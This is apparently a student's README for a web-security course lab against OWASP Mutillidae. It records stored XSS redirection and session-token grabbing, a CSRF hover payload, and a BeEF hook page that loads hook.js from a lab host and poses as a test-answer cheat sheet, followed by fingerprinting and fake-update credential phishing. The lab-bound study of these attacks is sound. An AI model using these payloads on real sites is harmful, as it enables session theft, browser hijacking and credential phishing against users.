# INFO-6076 – Web Security
## 💥 Lab 03: XSS, CSRF, and BeEF

This lab explores the exploitation of web vulnerabilities including **Stored XSS**, **Cross-Site Request Forgery (CSRF)**, and **Browser Exploitation Framework (BeEF)** techniques on a vulnerable web app: **OWASP Mutillidae**.

---

## 🔧 Prerequisites

- Kali Linux VM with Firefox and BeEF installed
- Ubuntu VM running Mutillidae
- Windows 10 VM with Firefox browser
- Internet connectivity
- Apache server on Kali
- VMware Workstation 16+

## 🧪 Lab Components

### ✅ Part 1: Stored XSS – Page Redirection
- Used `<script>window.location = "http://www.offensive-security.com/"</script>` on blog entry
- Demonstrated malicious redirection through stored XSS
- Verified on Windows 10 VM via Firefox
- Grabbing session tokens using `<script>document.location="http://oabolurin-uws/..."</script>`

📸 See `screenshots/slide01.png` and `slide02.png`

---

### ✅ Part 2: CSRF Attack via Blog Entry
- Identified and modified a CSRF payload using directory traversal
- Inserted invisible form submission using:
  ```html
  <i onmouseover="window.document.getElementById('f').submit()">oabolurin will get A+ in this course</i>

---

### ✅ Part 3: BeEF Setup and Hook
- Installed and ran beef-xss on Kali
- Created a hook-enabled HTML page (testanswers.html)
- Hooked a Windows 10 browser by redirecting via XSS payload
- Verified BeEF control panel is capturing browser

📸 See screenshots/slide04.png and HTML file testanswers.html

---

### ✅ Part 4: Hooking via Mutillidae Blog
- Used a modified blog entry with BeEF hook
- Logged into Mutillidae as victim user
- Hovered to trigger browser hook to BeEF panel

📸 See screenshots/slide05.png

---

### ✅ Part 5: System Fingerprinting via BeEF
- Verified virtual machine detection via hardware.gpu
- I dentified host environment in BeEF details tab

📸 See screenshots/slide06.png

---

### ✅ Part 6: Social Engineering via BeEF
- Executed “Fake Flash Update” attack
- Collected dummy Google credentials from victim
- Verified harvested data from BeEF control panel

📸 See screenshots/slide07.png

---

### 📂 Files Included
- testanswers.html – Hook-enabled attacker page for BeEF

screenshots/ – Contains slide screenshots (7 total)

---

### 📝 `testanswers.html` (sample payload for hooking)

```html
<!DOCTYPE html>
<html>
<head>
  <title>oabolurin</title>
  <script src="http://10.0.0.99:3000/hook.js"></script>
</head>
<body>
  <h1>Welcome to oabolurin’s Cheat Sheet!!!</h1>
  <p>You can find the answers to all of Art’s tests here.</p>
</body>
</html>
